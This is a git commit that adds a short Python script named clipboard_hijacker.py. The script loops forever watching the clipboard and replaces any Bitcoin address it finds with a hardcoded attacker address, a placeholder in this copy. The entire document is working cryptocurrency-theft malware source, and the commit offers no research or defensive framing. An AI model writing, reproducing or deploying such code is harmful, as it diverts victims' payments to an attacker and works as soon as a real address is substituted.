01c73e891dc63cebd8329b5493093f20c7cb063b
HighLionNet <tortman25@gmail.com>
2025-09-15 13:56:14 +0300

    Create clipboard_hijacker.py

---
+++ clipboard_hijacker.py
@@ -0,0 +1,11 @@
+#! /usr/bin/env python
+import time, re, pyperclip
+
+ATTACKER_ADDR = "1FakeBtcAddressDontUse123"
+btc_pattern = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')
+
+while True:
+    data = pyperclip.paste()
+    if btc_pattern.match(data):
+        pyperclip.copy(ATTACKER_ADDR)
+    time.sleep(0.5)
